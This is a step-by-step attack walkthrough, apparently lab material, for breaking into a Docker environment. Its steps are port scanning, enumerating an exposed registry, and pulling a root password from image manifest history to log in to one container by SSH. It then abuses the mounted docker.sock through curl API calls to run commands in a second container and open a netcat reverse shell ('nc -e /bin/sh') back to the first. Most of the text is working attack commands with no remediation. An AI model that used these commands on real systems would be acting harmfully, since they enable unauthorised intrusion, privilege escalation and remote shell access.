Attack1 :: Compromising Container C1:


Context:

A Docker Environment is running in an organization and it has several images and few containers running. It also has a docker registry service running on port 5000 for developers to access the status of images and containers.

An attacker (or an adversary) is in the same network as the system on which docker engine is installed (say Ubuntu). S(he) does not have access to the Ubuntu system (its very secure) however S(he) could see that there is a docker environment in the network as docker registry can be accessed on port 5000. The docker registry itself does not pose any serious security risk as it does not allow the user to create, delete or publish images (unless it is writable). The objective of the attacker is to find and exploit the vulnerabilities in the docker environment (if any) and eventually gain access to the underlying Ubuntu operating system.

1. Check running ports on the Ubuntu system by scanning its IP address (the IP Address of Ubuntu system is easy to discover assuming that the attacker is in the same network)

	nmap -Pn 192.168.2.44 -p- (assume IP is 192.168.2.44)
	
You would see that port 22 and port 5000 is open. 

2. We know that the Docker registry runs on port 5000 by default, we can try checking it in the browser to see if we get any response.

	http://192.168.2.44:5000/v2/_catalog

You would see a JSON response listing down all the available images on the registry. 

3. Each image can have different tags published which can be checked by following URL for each image.

	http://192.168.2.44:5000/v2/image-name/tags/list
	
Docker registry can also be used to read manifest file of the images. Manifest file basically contains all the information about that image since the image is built. These manifest file can unintentionally be exposing some sensitive information, who knows, lets check.

4. Hit following URL to read manifest file of an image (say my-ubuntu:vuln)

	http://192.168.2.44:5000/v2/my-ubuntu/manifests/vuln
	
A Manifest file will be downloaded. On checking you could see that there is a history section in the file which contains history of all the commands which were ran when the image was being built. On careful observation one could see that it is exposing a string named SECRET, whose value is being set as the password of root user in the very next command. In further commands, the root user is being enabled for login on SSH server which is running on port 22. As an attacker, we got the hint that the value of SECRET is the password for root user on SSH. Also port 22 was discovered during initial port scan.

5. Try logging into SSH on 192.168.2.44 (Ubuntu) using root user and you would get into the system as a root user.

	ssh root@192.168.2.44
	
However you would see that the system which we have just compromised is not actually Ubuntu system. It is one of the docker container running on that Ubuntu system. Since we got the password from the manifest file of ubuntu:vuln image, so we are inside the container of myubuntu:vuln. Also it is obvious by looking at the hostname of the system that we are inside some docker container.

So, Container C1 is compromised.

---

Attack1 :: Comprimising Container C2:

Background: 

Container C! is already compromised which has docker.sock file mounted at /var/run/docker.sock. This can leveraged to communicate with docker engine and get access to other running containers.

To communicate with Docker Engine using docker.sock, 'docker' command line tool should be installed however we are assuming that installation for 'docker' command line is blocked due to security reasons. 
So, We will be using Unix socket to communicate with Docker Engine.



1. List all docker images:

	curl -s --unix-socket /var/run/docker.sock -X GET http://localhost/images/json | jq

2. List all the running container:

	curl -s --unix-socket /var/run/docker.sock -X GET http://localhost/containers/json | jq
	
3. Choose the container id on which the command would be ran. (say 43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b)


4. Now, create exec instance from running container, basically, create an instance to run the command on the container.

	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }'
	
	Copy the exec id and use it to run the command

	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/46256aeee7dd58d3294d8a93679a80656e0a94e0a2b562e6c4d90679affd7e92/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
	
Now we know that we have the ability to run command on another container (C2), we can get the complete shell access of C2 by getting reverse shell, We would need netcat installed on C2 that can send us the reverse shell. We would need netcat on container C1 as well to catch the reverse shell.

5. Installing netcat on C1:

	apt install -y netcat (As simple as that)
	
6. Installing netcat on C2, Not that simple; Use the same curl technique to run command remotely:

	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","netcat"] }'

	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'

7. You can check if netcat has been installed properly

	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["which","nc"] }'

14b6a08a29fca55a35166f67b48e67cb56387722a67794b397936acc37a31c7a

	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'

8. Similarly, net-tools can be installed, however not needed, just to check the IP address of C2. But we would need the IP address of C1 (to send the reverse shell).

	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","net-tools"] }'


	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'

9. Check IP address of C1:

	ifconfig
	
(Lets say its 172.17.0.3)

10. Check IP address of C2:


	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["ifconfig"] }'


	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'


11. Open the shell listener on C1, on which C2 will send the reverse shell.


	nc -lvp 8080


12. Now, lets check if we are able to get complete access to C2, Moment of the truth! Run the netcat command from C2 and wait on C1 to recieve the shell.


	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["nc","-e","/bin/sh","172.17.0.3", "8080"] }'


	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'


TaDa!
